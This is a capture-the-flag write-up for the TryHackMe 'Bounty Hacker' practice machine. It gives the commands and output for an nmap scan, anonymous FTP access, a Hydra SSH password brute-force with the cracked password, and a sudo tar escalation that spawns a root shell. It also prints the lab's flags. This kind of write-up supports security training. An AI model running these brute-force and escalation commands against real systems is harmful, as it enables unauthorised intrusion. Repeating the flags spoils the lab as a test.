# Bounty Hunter Writeup (Easy)
### TryHackMe 
### Ean Dudley, 12/20/2021

### Task 1: Deploy The Machine 
Connect to the machine via the attack box or openvpn 

### Task 2: Find Open Ports 
I used NMAP to find open ports using the following syntax: 

``` bash
sudo nmap -sC -sV [TargetIP]
``` 

I got the following return: 

``` bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-20 13:11 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.94 seconds
```

Lets add the the flag ``` -Pn ``` and see if we can find any open ports. 
``` bash 
sudo nmap -sC -sV -Pn [TargetIP] 
```

Using the -Pn flag was successful and the following output was given: 
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-20 13:12 EST
Nmap scan report for 10.10.79.132
Host is up (0.14s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.77.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.40 seconds
```

There seem to be three ports running services that may be helpful: 
	Port 21 FTP 
	Port 22: SSH
	Port 80: TCP 

FTP also has anonymous login available to access two files: 
	- task.txt
	- locks.txt 
	
### Task 3: Who wrote the task list? 

FTP has a file called task.txt and anonymous access. Lets login to FTP and see if we can find out who wrote the tasklist. 

``` bash 
ftp [targetIP]
``` 

After executing this command you should get the following output, and be prompted for the name (See line 3 of the following output).  Enter: 'anonymous' to take advantage of the FTP anonymous login. 

```bash
Connected to 10.10.79.132.
220 (vsFTPd 3.0.3)
Name (10.10.79.132:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Now you should see your prompt change to ```ftp>``` and you can begin using FTP to read the files. Lets get both files onto our local machine and then read them. 

``` bash
ftp> get 
(remote-file) task.txt
(local-file) task.txt 

ftp> get 
(remote-file) lock.txt
(local-file) lock.txt
```

Back on our local machine lets read these files, starting with task.txt. 

``` bash
cat task.txt

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

We get our **Answer** for task 3: **lin**

### Task 4:  What service can you bruteforce with the text file found?

We can bruteforce** SSH** using Hydra since we have a username. Conveniently, the lock.txt file has a list of what appears to be passwords so we can run a wordlist based attack on SSH to login. 

### Task 5: What is the users password? 

Lets use **Hydra** as we talked about before to run an attack on SSH using the username lin. 

``` bash 
hydra -l lin -P locks.txt 10.10.79.132 -t 4 ssh
``` 

The ``` -l ``` flag specifies the username and the ``` -P ``` flag specifies the password list. The ``` -t 	``` flag is used to specifies the number of thread to use for the attack. Hydra recommends 4 threads for SSH. 

After running this command we should get the following output: 
``` bash 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-20 13:21:27
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.79.132:22/
[22][ssh] host: 10.10.79.132   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-20 13:21:37
``` 

We see that our password is: **RedDr4gonSynd1cat3**. 

### Task 6: user.txt 

Login to ssh using ``` lin@[targetIP]``` and when prompted for the password use the answer from question 4. 

After logging into the system use cat to read the user.txt file: 
``` bash 
cat user.txt 
THM{CR1M3_SyNd1C4T3}
```

**Flag: THM{CR1M3_SyNd1C4T3}**

### Task 7: root.txt 

Now that we have an initial foothold, lets try to gain root access. To start let's see if we have authorization to run anything as root that we may be able to exploit: 

```bash
sudo -l 
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

``` 

We see that we have authorization to run ``` tar ``` as root. We can exploit this by using the following command: 

``` bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```


*If you are unsure how to exploit tar, there are a lot of good resources online. This one is my favourite: https://gtfobins.github.io/gtfobins/tar/*

We should not be able to pop a shell with root access: 

``` bash 
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
cat /root/root.txt
THM{80UN7Y_h4cK3r}
``` 

We get our **root flag: THM{80UN7Y_h4cK3r}**

### Summary 
We initially scan this machine using nmap and have to force ports to respond using the  -Pn option. From NMAP we see that we can login to FTP anonymous access in order to read a tasklist and a password list. We can then use that password list and the username found in the tasklist to brute-force an attack on SSH using Hydra. Using the login credentials to SSH found by Hydra, we can login and get our initial access. Then we can use sudo on the target machine to find if there are any vulnerable commands we can utilize to get root access. Sudo shows that tar is able to be executed at a super user level, and we are able to exploit tar to get root level access. 
